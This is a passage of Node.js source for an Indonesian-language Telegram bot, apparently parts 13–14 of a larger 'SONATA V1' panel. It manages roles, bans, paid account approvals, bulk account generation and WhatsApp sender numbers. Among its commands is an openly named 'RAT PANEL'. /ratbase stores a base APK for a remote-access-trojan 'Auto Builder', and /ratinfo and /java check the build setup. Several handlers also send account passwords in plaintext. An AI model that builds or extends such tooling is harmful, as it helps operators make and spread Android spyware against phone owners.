  if (finalRole === 'PEMULA' || finalRole === 'DEV') {
    return bot.sendMessage(chatId, header, {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🆕 BUAT AKUN PEMULA', callback_data: 'pemula_create' },   { text: '📄 CEK AKUN SAYA', callback_data: 'pemula_cek' }],
          [{ text: '🔎 CEK AKUN LENGKAP', callback_data: 'pemula_ceklengkap' }, { text: '🔎 CEK USER', callback_data: 'pemula_cekuser' }],
          [{ text: '⬆️ UP ROLE USER', callback_data: 'pemula_uprole' },        { text: '🔗 CREATE LINK GROUP', callback_data: 'pemula_link' }],
          [{ text: '🗑 HAPUS USER', callback_data: 'pemula_hapus' },           { text: '⏳ SET EXPIRED', callback_data: 'pemula_expired' }],
          [{ text: '🎛 BUAT CUSTOM AKUN', callback_data: 'pemula_custom' },    { text: '🌟 BERKAH', callback_data: 'pemula_berkah' }],
          [{ text: '🌐 ADD SENDER GLOBAL', callback_data: 'pemula_global_sender' }],
          [{ text: '⚠️ HAPUS AKUN SAYA', callback_data: 'pemula_delakun' }]
        ]
      }
    });
  }
  const buttons = [
    [{ text: `🆕 BUAT AKUN SAYA (${finalRole})`, callback_data: `role_create` }],
    [{ text: '📄 CEK AKUN SAYA', callback_data: 'role_cek' }],
    [{ text: '⚠️ HAPUS AKUN SAYA', callback_data: 'role_delakun' }]
  ];

  return bot.sendMessage(chatId, header, {
    parse_mode: 'HTML',
    reply_markup: { inline_keyboard: buttons }
  });
}

bot.onText(/^\/?(start|menu)/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat.type;

  if (chatType !== 'private') {
    return bot.sendMessage(chatId, '⚠️ Menu hanya bisa dibuka di private chat.\nKlik bot ini untuk chat pribadi.', { parse_mode: 'HTML' });
  }

  return sendMainMenu(chatId, userId);
});

bot.onText(/^\/addgroup\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const roleArg = String(match[1] || '').toUpperCase();

  if (!isDevUser(userId)) {
    return bot.sendMessage(chatId, '❌ Hanya PEMULA yang bisa pakai /addgroup.', { parse_mode: 'HTML' });
  }

  if (!GROUP_ROLES_VALID.includes(roleArg)) {
    return bot.sendMessage(chatId, `❌ Role tidak valid.\n\nRole yang bisa: <b>${GROUP_ROLES_VALID.join(', ')}</b>`, { parse_mode: 'HTML' });
  }

  let targetGroupId = null;
  if (msg.reply_to_message) {
    targetGroupId = msg.reply_to_message.chat.id;
  } else if (msg.chat.type === 'group' || msg.chat.type === 'supergroup') {
    targetGroupId = chatId;
  }

  if (!targetGroupId) {
    return bot.sendMessage(chatId, '❌ Reply pesan di grup target, atau kirim command ini di dalam grup target.', { parse_mode: 'HTML' });
  }

  const cfg = loadTelegramConfig();
  cfg.groups[String(targetGroupId)] = roleArg;
  saveTelegramConfig(cfg);

  console.log(`[GROUP-ROLE] ${targetGroupId} → ${roleArg} oleh PEMULA ${userId}`);

  return bot.sendMessage(chatId, `✅ <b>Grup berhasil di-add!</b>\n\nGroup ID: <code>${targetGroupId}</code>\nRole: <b>${roleArg}</b>\n\nGrup ini dipetakan ke role <b>${roleArg}</b>; keanggotaan grup tidak memberi izin membuat akun otomatis.`, { parse_mode: 'HTML' });
});

bot.onText(/^\/removegroup\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const roleArg = String(match[1] || '').toUpperCase();

  if (!isDevUser(userId)) return bot.sendMessage(chatId, '❌ Hanya PEMULA.', { parse_mode: 'HTML' });

  const cfg = loadTelegramConfig();
  let removed = 0;
  for (const [gid, role] of Object.entries(cfg.groups)) {
    if (String(role).toUpperCase() === roleArg) {
      delete cfg.groups[gid];
      removed++;
    }
  }
  saveTelegramConfig(cfg);

  return bot.sendMessage(chatId, removed > 0
    ? `✅ Dihapus <b>${removed}</b> grup dengan role <b>${roleArg}</b>.`
    : `❌ Tidak ada grup dengan role <b>${roleArg}</b>.`, { parse_mode: 'HTML' });
});

const BAN_FILE = path.join(__dirname, 'banned_users.json');
function loadBans(){ try { return JSON.parse(fs.readFileSync(BAN_FILE,'utf8')); } catch (_) { return {}; } }
function saveBans(v){ fs.writeFileSync(BAN_FILE, JSON.stringify(v,null,2)); }
function canModerateTelegram(id){ const cfg=loadTelegramConfig(); return Number(id)===Number(process.env.OWNER_ID||0) || (cfg.ownerList||[]).map(Number).includes(Number(id)) || (cfg.devList||[]).map(Number).includes(Number(id)); }

bot.onText(/^\/ban\s+(\d{5,20})\s+(.+)/i, async (msg, match) => {
  const actor=msg.from.id, target=String(match[1]), reason=String(match[2]||'').trim();
  if(!canModerateTelegram(actor)) return bot.sendMessage(msg.chat.id,'❌ Hanya OWNER dan PEMULA yang boleh melakukan ban.');
  if(target===String(actor)) return bot.sendMessage(msg.chat.id,'❌ Tidak bisa ban diri sendiri.');
  const bans=loadBans(); bans[target]={id:target,reason,by:String(actor),at:new Date().toISOString()}; saveBans(bans);
  const cfg=loadTelegramConfig();
  const groups=Object.keys(cfg.groups||{});
  let notified=0;
  for(const gid of groups){ try { await bot.banChatMember(Number(gid), Number(target)); } catch(_){} try { await bot.sendMessage(Number(gid),`🚫 <b>PEMBERITAHUAN BAN</b>\nID: <code>${target}</code>\nAlasan: ${reason.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}\nModerator: <code>${actor}</code>`,{parse_mode:'HTML'}); notified++; } catch(_){} }
  return bot.sendMessage(msg.chat.id,`✅ ID ${target} masuk daftar blokir. Notifikasi terkirim ke ${notified} grup.`);
});

bot.onText(/^\/unban\s+(\d{5,20})$/i, async (msg, match) => {
  if(!canModerateTelegram(msg.from.id)) return bot.sendMessage(msg.chat.id,'❌ Hanya OWNER dan PEMULA yang boleh melakukan unban.');
  const target=String(match[1]), bans=loadBans(); if(!bans[target]) return bot.sendMessage(msg.chat.id,'ID tersebut tidak ada dalam daftar blokir.');
  delete bans[target]; saveBans(bans);
  const cfg=loadTelegramConfig(); let notified=0;
  for(const gid of Object.keys(cfg.groups||{})){ try { await bot.unbanChatMember(Number(gid), Number(target), {only_if_banned:true}); } catch(_){} try { await bot.sendMessage(Number(gid),`✅ <b>PEMBERITAHUAN UNBAN</b>\nID: <code>${target}</code>\nModerator: <code>${msg.from.id}</code>`,{parse_mode:'HTML'}); notified++; } catch(_){} }
  return bot.sendMessage(msg.chat.id,`✅ ID ${target} dihapus dari daftar blokir. Notifikasi terkirim ke ${notified} grup.`);
});

bot.onText(/^\/cek(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const allowedIds = [Number(process.env.OWNER_ID || 0), ...(loadTelegramConfig().devList || [])];
  const isAllowed = allowedIds.map(Number).includes(Number(userId));

  let targetId = null;
  if (msg.reply_to_message?.from?.id) targetId = msg.reply_to_message.from.id;
  else if (match[1]) targetId = Number(match[1].trim());

  if (!targetId) return bot.sendMessage(chatId, '❌ Reply pesan user atau kirim ID.\nContoh: <code>/cek 123456789</code>', { parse_mode: 'HTML' });

  try {
    let targetRole = await resolveTelegramRole(targetId);
    const db = loadDatabase();
    const account = db.find(u => Number(u.telegramId) === Number(targetId) || Number(u.telegramLinkId) === Number(targetId));
    if (account) targetRole = String(account.role || 'member').toUpperCase();

    let txt = `<b>CEK USER</b>\n\n`;
    txt += `ID: <code>${targetId}</code>\n`;
    txt += `Role: <b>${targetRole || 'MEMBER (no group)'}</b>\n`;

    if (account) {
      txt += `\n<b>— Akun —</b>\n`;
      txt += `Username: <b>${account.username}</b>\n`;
      txt += `Password: <i>disembunyikan demi keamanan</i>\n`;
      txt += `Expired: <b>${account.expiredDate || '-'}</b>\n`;
      txt += `UID: <code>${account.uid || '-'}</code>\n`;
    } else {
      txt += `\n❌ Belum punya akun.\n`;
    }

    return bot.sendMessage(chatId, txt, { parse_mode: 'HTML' });
  } catch (err) {
    return bot.sendMessage(chatId, `❌ Error: ${err.message}`, { parse_mode: 'HTML' });
  }
});

bot.onText(/^\/ratbase$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isDevUser(userId) && Number(userId) !== Number(process.env.OWNER_ID || 0)) {
    return bot.sendMessage(chatId, '❌ Hanya PEMULA / OWNER.');
  }

  if (!msg.reply_to_message?.document) {
    return bot.sendMessage(chatId, '❌ Reply file APK polosan dengan command /ratbase');
  }

  const doc = msg.reply_to_message.document;
  if (!doc.file_name.endsWith('.apk')) {
    return bot.sendMessage(chatId, '❌ File harus .apk');
  }

  await bot.sendMessage(chatId, '⏳ Mendownload dan menyimpan APK polosan...');

  try {
    const fileLink = await bot.getFileLink(doc.file_id);
    const r = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(r.data);

    const targetPath = path.join(__dirname, 'rat_base.apk');
    fs.writeFileSync(targetPath, buffer);

    if (fs.existsSync(RAT_BASE_DECODED)) {
      fs.rmSync(RAT_BASE_DECODED, { recursive: true, force: true });
      console.log('[RATBASE] Cache rat_base_decoded dihapus, next build akan decode ulang.');
    }

    const payload = JSON.stringify({ type: 'rat_update', message: 'APK RAT terbaru sudah diupload!' });
    wss.clients.forEach(c => { if (c.readyState === 1) c.send(payload); });

    bot.sendMessage(chatId, `✅ Berhasil! File <code>rat_base.apk</code> (${(buffer.length / 1024 / 1024).toFixed(2)} MB) tersimpan. Cache decode dibersihkan, build berikutnya otomatis decode ulang.`, { parse_mode: 'HTML' });
  } catch (e) {
    bot.sendMessage(chatId, `❌ Gagal: ${e.message}`);
  }
});

bot.onText(/^\/ratinfo$/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!fs.existsSync(RAT_BASE_APK)) {
    return bot.sendMessage(chatId, '❌ Base APK belum diupload.');
  }
  const st = fs.statSync(RAT_BASE_APK);
  bot.sendMessage(chatId, `<b>INFO BASE APK RAT</b>\n\nFile: <code>rat_base.apk</code>\nSize: <b>${(st.size / 1024 / 1024).toFixed(2)} MB</b>\nUpload: <b>${st.mtime.toISOString()}</b>`, { parse_mode: 'HTML' });
});

bot.onText(/^\/rat$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const hasBase = fs.existsSync(RAT_BASE_APK);
  let baseInfo = '❌ Belum diupload';
  if (hasBase) {
    const st = fs.statSync(RAT_BASE_APK);
    baseInfo = `✅ ${(st.size / 1024 / 1024).toFixed(2)} MB — ${st.mtime.toISOString().slice(0, 19)}`;
  }

  let javaInfo = '❌ Tidak terdeteksi';
  try {
    if (typeof isJavaInstalled === 'function' && isJavaInstalled()) {
      const v = (typeof getJavaVersionString === 'function' && getJavaVersionString()) || 'Installed';
      const bin = (typeof findJavaBinary === 'function' && findJavaBinary()) || 'java';
      javaInfo = `✅ ${v}\n<code>${bin}</code>`;
    }
  } catch (_) {}

  const txt = `<b>🐀 RAT PANEL</b>

<b>Base APK:</b> ${baseInfo}
<b>Java:</b> ${javaInfo}

<b>Command tersedia:</b>
• <code>/ratbase</code> — Upload APK polosan (reply file .apk) <i>PEMULA only</i>
• <code>/ratinfo</code> — Info file base APK
• <code>/java</code> — Cek / coba install Java <i>PEMULA only</i>
• <code>/rat</code> — Menu ini

${hasBase && javaInfo.startsWith('✅') ? '✅ Auto Builder siap dipakai.' : '⚠️ Auto Builder belum siap (butuh Base APK + Java).'}`;

  return bot.sendMessage(chatId, txt, { parse_mode: 'HTML' });
});

bot.onText(/^\/java$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isDevUser(userId) && Number(userId) !== Number(process.env.OWNER_ID || 0)) {
    return bot.sendMessage(chatId, '❌ Hanya PEMULA / OWNER.');
  }

  await bot.sendMessage(chatId, '⏳ Mengecek Java...');

  try {
    if (typeof isJavaInstalled === 'function' && isJavaInstalled()) {
      const ver = (typeof getJavaVersionString === 'function' && getJavaVersionString()) || 'Installed';
      const bin = (typeof findJavaBinary === 'function' && findJavaBinary()) || 'java';
      return bot.sendMessage(chatId, `✅ <b>Java sudah terinstall</b>\n<code>${ver}</code>\nPath: <code>${bin}</code>`, { parse_mode: 'HTML' });
    }

    await bot.sendMessage(chatId, '⚠️ Java belum ada.\nMencoba auto-fix (package manager → portable JRE)...\nBisa 1–5 menit, tunggu ya.');

    if (typeof tryInstallJavaAsync === 'function') {
      const ok = await tryInstallJavaAsync();
      if (ok) {
        const ver = (typeof getJavaVersionString === 'function' && getJavaVersionString()) || 'OK';
        const bin = (typeof findJavaBinary === 'function' && findJavaBinary()) || 'java';
        JAVA_BIN = bin;
        return bot.sendMessage(chatId, `✅ <b>Java berhasil diinstall</b>\n<code>${ver}</code>\nPath: <code>${bin}</code>`, { parse_mode: 'HTML' });
      }
    }

    return bot.sendMessage(chatId, `❌ Gagal auto-fix Java.\n\nServer mungkin tidak punya akses internet ke api.adoptium.net atau tidak punya tar.\n\nManual via SSH:\n<code>apt-get update && apt-get install -y openjdk-17-jre-headless</code>`, { parse_mode: 'HTML' });
  } catch (e) {
    return bot.sendMessage(chatId, `❌ Error: ${e.message}`);
  }
});

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 13/15");
console.log("    STATUS : BOT HELPER + MENU PEMULA + CEK LENGKAP + BERKAH HELPER OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

// ═══════════════════════════════════════════════════════════════════════
//  Part 14/15: TELEGRAM BOT CALLBACK HANDLER
// ═══════════════════════════════════════════════════════════════════════

const userFlow = new Map();

function setFlow(userId, step, meta = {}) {
  userFlow.set(userId, { ...meta, step, createdAt: Date.now() });
}

function getFlow(userId) {
  return userFlow.get(userId) || null;
}

function clearFlow(userId) {
  userFlow.delete(userId);
}

bot.on('callback_query', async (q) => {
  const userId = q.from.id;
  const chatId = q.message.chat.id;
  const data = q.data;

  try { await bot.answerCallbackQuery(q.id); } catch (_) {}

  if (typeof data === 'string' && (data.startsWith('acc_purchase_') || data.startsWith('rej_purchase_'))) {
    if (String(chatId) !== String(ACC_GROUP_ID)) {
      return bot.sendMessage(chatId, '❌ Persetujuan hanya bisa dilakukan di grup admin pembayaran yang dikonfigurasi.');
    }
    const approve = data.startsWith('acc_purchase_');
    const reqId = data.replace(/^acc_purchase_/, '').replace(/^rej_purchase_/, '');
    const requests = loadPurchases();
    const item = requests.find(x => x.id === reqId);
    if (!item || item.status !== 'pending') return bot.sendMessage(chatId, 'Permintaan tidak ditemukan atau sudah diproses.');
    if (!approve) {
      item.status = 'rejected'; item.decidedAt = new Date().toISOString(); item.decidedBy = userId; savePurchases(requests);
      return bot.sendMessage(chatId, `❌ Permintaan ${reqId} ditolak.`);
    }
    if (item.mode === 'purchase' || item.mode === 'seller_create') {
      const result = await commitAccountCreate(item.account, {status:'accepted',source:item.mode === 'seller_create' ? 'SELLER_SALE' : 'BUY_ACCESS',note:`ACC oleh Telegram ${userId}${item.seller ? ' — penjual '+item.seller : ''}`,photoPath:item.proofPath});
      if (!result.ok) return bot.sendMessage(chatId, `Gagal membuat akun: ${result.message}`);
    } else if (item.mode === 'upgrade') {
      const db = loadDatabase(); const target = db.find(u => u.username === item.username);
      if (!target) return bot.sendMessage(chatId, 'Akun target tidak ditemukan.');
      target.role = item.to; saveDatabase(db);
      pushCreateHistory({id:reqId,username:item.username,role:item.to,status:'accepted',source:'UP_ROLE',createdBy:item.username,note:`Upgrade ${item.from} ke ${item.to}`,createdAt:item.createdAt,decidedAt:new Date().toISOString()});
      void backupDatabaseToDev(`Up role: ${item.username} -> ${item.to}`);
    }
    item.status = 'accepted'; item.decidedAt = new Date().toISOString(); item.decidedBy = userId; savePurchases(requests);
    return bot.sendMessage(chatId, `✅ Permintaan ${reqId} disetujui. ${['purchase','seller_create'].includes(item.mode) ? 'Akun sudah dibuat.' : 'Role sudah diaktifkan.'}`);
  }

  if (typeof data === 'string' && (data.startsWith('acc_create_') || data.startsWith('rej_create_'))) {
    const isAcc = data.startsWith('acc_create_');
    const pendingId = data.replace(/^acc_create_/, '').replace(/^rej_create_/, '');
    const pending = loadPendingCreates();
    const idx = pending.findIndex(p => p.id === pendingId);
    if (idx === -1) {
      return bot.sendMessage(chatId, '❌ Request create tidak ditemukan / sudah diproses.');
    }
    const item = pending[idx];
    if (item.status !== 'pending') {
      return bot.sendMessage(chatId, `ℹ️ Sudah diproses: ${item.status}`);
    }

    if (isAcc) {
      const result = await commitAccountCreate(item.account, {
        status: 'accepted',
        source: 'APK',
        note: `ACC by TG ${userId}`,
        photoPath: item.photoPath
      });
      pending[idx].status = result.ok ? 'accepted' : 'error';
      pending[idx].decidedBy = userId;
      pending[idx].decidedAt = new Date().toISOString();
      savePendingCreates(pending);
      const hist = loadCreateHistory();
      const hi = hist.findIndex(h => h.id === pendingId);
      if (hi !== -1) {
        hist[hi].status = result.ok ? 'accepted' : 'error';
        hist[hi].note = result.ok ? 'Sudah Ter ACC' : (result.message || 'error');
        hist[hi].decidedAt = new Date().toISOString();
        saveCreateHistory(hist);
      }
      if (!result.ok) return bot.sendMessage(chatId, `❌ Gagal create: ${result.message}`);
      return bot.sendMessage(chatId, `✅ <b>ACC</b> — akun <code>${item.account.username}</code> (${item.account.role}) dibuat.`, { parse_mode: 'HTML' });
    } else {
      pending[idx].status = 'rejected';
      pending[idx].decidedBy = userId;
      pending[idx].decidedAt = new Date().toISOString();
      savePendingCreates(pending);
      const hist = loadCreateHistory();
      const hi = hist.findIndex(h => h.id === pendingId);
      if (hi !== -1) {
        hist[hi].status = 'rejected';
        hist[hi].note = 'Ditolak';
        hist[hi].decidedAt = new Date().toISOString();
        saveCreateHistory(hist);
      }
      return bot.sendMessage(chatId, `❌ <b>TOLAK</b> — create <code>${item.account.username}</code> dibatalkan.`, { parse_mode: 'HTML' });
    }
  }

  const role = await resolveTelegramRole(userId);
  const roleLabel = role || 'MEMBER';

  if (data === 'role_create') {
    return bot.sendMessage(chatId, 'ℹ️ Pembuatan akun melalui bot Telegram sudah dinonaktifkan. Gunakan menu Buy Account di APK.');
  }

  if (data === 'role_cek' || data === 'pemula_cek') {
    const acc = getUserByTelegramId(userId);
    if (!acc) return bot.sendMessage(chatId, '❌ Kamu belum punya akun.');

    return bot.sendMessage(chatId,
      `<b>📄 AKUN SAYA</b>\n\nUsername: <b>${acc.username}</b>\nPassword: <b>${acc.password}</b>\nRole: <b>${(acc.role || 'member').toUpperCase()}</b>\nExpired: <b>${acc.expiredDate || '-'}</b>\nUID: <code>${acc.uid || '-'}</code>`,
      { parse_mode: 'HTML' }
    );
  }

  if (data === 'role_delakun' || data === 'pemula_delakun') {
    const r = deleteOwnAccount(userId);
    if (!r.ok) return bot.sendMessage(chatId, r.message);
    return bot.sendMessage(chatId, `🗑 Akun <b>${r.user.username}</b> berhasil dihapus.\nKamu bisa bikin akun baru sekarang.`, { parse_mode: 'HTML' });
  }

  if (data === 'pemula_create') {
    if (chatId < 0 || q.message.chat.type !== 'private') return bot.sendMessage(chatId, '❌ Pembuatan akun hanya boleh lewat private chat bot.');
    if (role !== 'PEMULA' && role !== 'DEV') return bot.sendMessage(chatId, '❌ Hanya PEMULA.');
    if (telegramUserHasAccount(userId)) return bot.sendMessage(chatId, '❌ Kamu sudah punya akun. Hapus dulu.');
    setFlow(userId, 'PEMULA_CREATE_USERNAME', { chatId, role: 'pemula' });
    return bot.sendMessage(chatId, '🆕 <b>BUAT AKUN PEMULA</b>\n\nMasukkan <b>username</b>.', { parse_mode: 'HTML' });
  }

  if (data === 'pemula_ceklengkap') {
    if (role !== 'PEMULA' && role !== 'DEV') return;
    setFlow(userId, 'PEMULA_CEK_LENGKAP_USERNAME', { chatId });
    return bot.sendMessage(chatId, '🔎 <b>CEK AKUN LENGKAP</b>\n\nKirim <b>username</b> akun yang mau dicek.', { parse_mode: 'HTML' });
  }

  if (data === 'pemula_berkah') {
    if (q.message.chat.type !== 'private') return bot.sendMessage(chatId, '❌ Fitur BERKAH hanya boleh lewat private chat bot.');
    if (role !== 'PEMULA' && role !== 'DEV') return bot.sendMessage(chatId, '❌ Fitur BERKAH hanya untuk PEMULA.');
    setFlow(userId, 'PEMULA_BERKAH_ROLE', { chatId });
    return bot.sendMessage(chatId,
      `🌟 <b>BERKAH — PILIH ROLE</b>\n\nDurasi: ${BERKAH_CONFIG.DURATION_DAYS} hari\nMax per batch: ${BERKAH_CONFIG.MAX_PER_BATCH} akun\nOWNER cap harian: ${BERKAH_CONFIG.OWNER_DAILY_CAP}`,
      {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '👤 MEMBER', callback_data: 'berkah_role_member' }, { text: '💼 RESELLER', callback_data: 'berkah_role_reseller' }],
            [{ text: '⚡ FULLUP', callback_data: 'berkah_role_fullup' }, { text: '👑 OWNER', callback_data: 'berkah_role_owner' }],
            [{ text: '❌ Batal', callback_data: 'berkah_cancel' }]
          ]
        }
      }
    );
  }

  if (data === 'pemula_global_sender') {
    if (q.message.chat.type !== 'private') return bot.sendMessage(chatId, '❌ Add Sender Global hanya lewat private chat PEMULA.');
    if (role !== 'PEMULA' && role !== 'DEV') return bot.sendMessage(chatId, '❌ Hanya PEMULA yang dapat menambah Sender Global.');
    setFlow(userId, 'PEMULA_GLOBAL_SENDER_NUMBER', { chatId });
    return bot.sendMessage(chatId, '🌐 <b>ADD SENDER GLOBAL</b>\n\nKirim nomor WhatsApp format internasional, contoh: <code>62812xxxxxxx</code>.', { parse_mode: 'HTML' });
  }

  if (data === 'pemula_cekuser') {
    if (role !== 'PEMULA' && role !== 'DEV') return;
    setFlow(userId, 'PEMULA_CEKUSER', { chatId });
    return bot.sendMessage(chatId, '🔎 Kirim <b>ID Telegram</b> user yang mau dicek, atau reply pesan user.', { parse_mode: 'HTML' });
  }

  if (data === 'pemula_uprole') {
    if (role !== 'PEMULA' && role !== 'DEV') return;
    setFlow(userId, 'PEMULA_UPROLE', { chatId });
    return bot.sendMessage(chatId, '⬆️ Kirim <b>ID Telegram</b> user yang mau diup rolenya.', { parse_mode: 'HTML' });
  }

  if (data === 'pemula_link') {
    if (role !== 'PEMULA' && role !== 'DEV') return;
    setFlow(userId, 'PEMULA_LINK', { chatId });
    return bot.sendMessage(chatId, `🔗 <b>CREATE LINK GROUP ROLE</b>\n\nBalas dengan role:\n<b>${GROUP_ROLES_VALID.join(' / ')}</b>`);
  }

  if (data === 'pemula_hapus') {
    if (role !== 'PEMULA' && role !== 'DEV') return;
    setFlow(userId, 'PEMULA_HAPUS', { chatId });
    return bot.sendMessage(chatId, '🗑 Kirim <b>username</b> yang mau dihapus dari database.', { parse_mode: 'HTML' });
  }

  if (data === 'pemula_expired') {
    if (role !== 'PEMULA' && role !== 'DEV') return;
    setFlow(userId, 'PEMULA_EXPIRED', { chatId });
    return bot.sendMessage(chatId, '⏳ Kirim <b>username|tambah_hari</b>\nContoh: <code>user123|30</code>', { parse_mode: 'HTML' });
  }

  if (data === 'pemula_custom') {
    if (q.message.chat.type !== 'private') return bot.sendMessage(chatId, '❌ Pembuatan akun hanya boleh lewat private chat bot.');
    if (role !== 'PEMULA' && role !== 'DEV') return;
    setFlow(userId, 'PEMULA_CUSTOM_USERNAME', { chatId });
    return bot.sendMessage(chatId, '🎛 <b>BUAT CUSTOM AKUN</b>\n\nMasukkan <b>username</b>.', { parse_mode: 'HTML' });
  }

  if (typeof data === 'string' && data.startsWith('berkah_role_')) {
    if (q.message.chat.type !== 'private') return bot.sendMessage(chatId, '❌ Fitur BERKAH hanya lewat private chat.');
    if (role !== 'PEMULA' && role !== 'DEV') return;
    const flow = getFlow(userId);
    if (!flow || flow.step !== 'PEMULA_BERKAH_ROLE') return bot.sendMessage(chatId, '❌ Sesi berkah sudah habis. Klik menu BERKAH lagi.');
    const chosenRole = data.replace('berkah_role_', '');
    if (!BERKAH_CONFIG.ALLOWED_ROLES.includes(chosenRole)) return bot.sendMessage(chatId, '❌ Role tidak valid.');
    setFlow(userId, 'PEMULA_BERKAH_COUNT', { chatId, role: chosenRole });
    return bot.sendMessage(chatId, `🌟 <b>BERKAH ${chosenRole.toUpperCase()}</b>\n\nMasukkan jumlah akun (1-${BERKAH_CONFIG.MAX_PER_BATCH}).`, { parse_mode: 'HTML' });
  }

  if (data === 'berkah_cancel') {
    clearFlow(userId);
    return bot.sendMessage(chatId, '❌ Fitur BERKAH dibatalkan.');
  }

  if (/^(days|pemuladays)_\d+$/.test(data)) {
    if (q.message.chat.type !== 'private') return bot.sendMessage(chatId, '❌ Pembuatan akun hanya boleh lewat private chat bot.');
    const days = Number(data.split('_')[1]);
    const flow = getFlow(userId);
    if (!flow || !['ROLE_CREATE_DAYS','PEMULA_CREATE_DAYS'].includes(flow.step)) return bot.sendMessage(chatId, '❌ Sesi pembuatan akun sudah habis.');
    const roleToCreate = flow.step === 'PEMULA_CREATE_DAYS' ? 'pemula' : flow.role;
    const r = createAccountFromTelegram({tgId:userId,tgUsername:q.from.username,role:roleToCreate,username:flow.username,password:flow.password,days});
    clearFlow(userId);
    if (!r.ok) return bot.sendMessage(chatId, r.message);
    return bot.sendMessage(chatId, `✅ <b>AKUN AKTIF</b>\n\nUsername: <b>${r.user.username}</b>\nPassword: <b>${r.user.password}</b>\nRole: <b>${r.user.role.toUpperCase()}</b>\nExpired: <b>${r.user.expiredDate}</b>`, {parse_mode:'HTML'});
  }

  if (/^customrole_/.test(data)) {
    if (q.message.chat.type !== 'private' || role !== 'PEMULA') return bot.sendMessage(chatId, '❌ Custom akun hanya lewat private chat PEMULA.');
    const flow = getFlow(userId);
    if (!flow || flow.step !== 'PEMULA_CUSTOM_ROLE') return bot.sendMessage(chatId, '❌ Sesi custom akun sudah habis.');
    const selectedRole = data.replace('customrole_','');
    if (!ROLE_HIERARCHY.includes(selectedRole)) return bot.sendMessage(chatId, '❌ Role tidak valid.');
    setFlow(userId,'PEMULA_CUSTOM_DAYS',{...flow,roleKey:selectedRole});
    return bot.sendMessage(chatId,'⏳ Pilih durasi akun:',{reply_markup:{inline_keyboard:[[ {text:'1 Hari',callback_data:'customdays_1'},{text:'7 Hari',callback_data:'customdays_7'} ],[ {text:'30 Hari',callback_data:'customdays_30'},{text:'90 Hari',callback_data:'customdays_90'} ],[ {text:'365 Hari',callback_data:'customdays_365'} ]]}});
  }

  if (/^customdays_\d+$/.test(data)) {
    if (q.message.chat.type !== 'private' || role !== 'PEMULA') return bot.sendMessage(chatId, '❌ Custom akun hanya lewat private chat PEMULA.');
    const flow = getFlow(userId);
    if (!flow || flow.step !== 'PEMULA_CUSTOM_DAYS') return bot.sendMessage(chatId, '❌ Sesi custom akun sudah habis.');
    const days = Number(data.split('_')[1]);
    const db = loadDatabase();
    if (db.some(x=>x.username===flow.username)) return bot.sendMessage(chatId,'❌ Username sudah ada.');
    const cur = new Date(); cur.setDate(cur.getDate()+days);
    const account = {username:flow.username,password:flow.password,role:flow.roleKey,uid:crypto.createHash('md5').update(flow.username).digest('hex'),expiredDate:cur.toISOString().split('T')[0],createdAt:new Date().toISOString(),createdBy:'PEMULA_BOT',accountType:'CUSTOM'};
    db.push(account); saveDatabase(db); rememberUserIdentity(account, 'TELEGRAM_CUSTOM'); void notifyAccountCreated(account,'TELEGRAM'); clearFlow(userId);
    return bot.sendMessage(chatId,`✅ <b>AKUN CUSTOM DIBUAT</b>\n\nUsername: <b>${account.username}</b>\nPassword: <b>${account.password}</b>\nRole: <b>${account.role.toUpperCase()}</b>\nExpired: <b>${account.expiredDate}</b>`,{parse_mode:'HTML'});
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text || '';

  if (!text || text.startsWith('/')) return;
  const seenKey = `${userId}:${msg.message_id}`;
  if (globalThis.__redgraySeenTelegramMessages?.has(seenKey)) return;
  if (!globalThis.__redgraySeenTelegramMessages) globalThis.__redgraySeenTelegramMessages = new Set();
  globalThis.__redgraySeenTelegramMessages.add(seenKey);
  setTimeout(() => globalThis.__redgraySeenTelegramMessages.delete(seenKey), 120000).unref?.();
  if (msg.chat.type !== 'private') { clearFlow(userId); return; }

  const flow = getFlow(userId);
  if (!flow) return;

  if (Date.now() - flow.createdAt > 10 * 60 * 1000) {
    clearFlow(userId);
    return bot.sendMessage(chatId, '⏰ Flow expired. Ketik /start lagi.');
  }

  if (flow.step === 'PEMULA_CEK_LENGKAP_USERNAME') {
    const roleNow = await resolveTelegramRole(userId);
    if (roleNow !== 'PEMULA' && roleNow !== 'DEV') { clearFlow(userId); return bot.sendMessage(chatId, '❌ Hanya PEMULA.'); }
    const username = text.trim();
    if (!username) { clearFlow(userId); return bot.sendMessage(chatId, '❌ Username kosong.'); }
    const report = buildFullAccountReport(username);
    clearFlow(userId);
    if (!report) return bot.sendMessage(chatId, `❌ Akun dengan username <code>${username}</code> tidak ditemukan.`, { parse_mode: 'HTML' });
    return bot.sendMessage(chatId, report, { parse_mode: 'HTML' });
  }

  if (flow.step === 'PEMULA_BERKAH_COUNT') {
    const roleNow = await resolveTelegramRole(userId);
    if (roleNow !== 'PEMULA' && roleNow !== 'DEV') { clearFlow(userId); return bot.sendMessage(chatId, '❌ Hanya PEMULA.'); }
    const count = Number(text.trim());
    if (!Number.isInteger(count) || count < 1 || count > BERKAH_CONFIG.MAX_PER_BATCH) {
      return bot.sendMessage(chatId, `❌ Jumlah harus angka 1-${BERKAH_CONFIG.MAX_PER_BATCH}. Coba lagi atau klik ❌ Batal.`);
    }
    const chosenRole = flow.role;
    const creatorUsername = getTelegramUserUsername(userId) || `TG_${userId}`;

    await bot.sendMessage(chatId, `⏳ Generating ${count} akun ${chosenRole.toUpperCase()}...`);

    const result = generateBerkahAccounts({
      role: chosenRole,
      count,
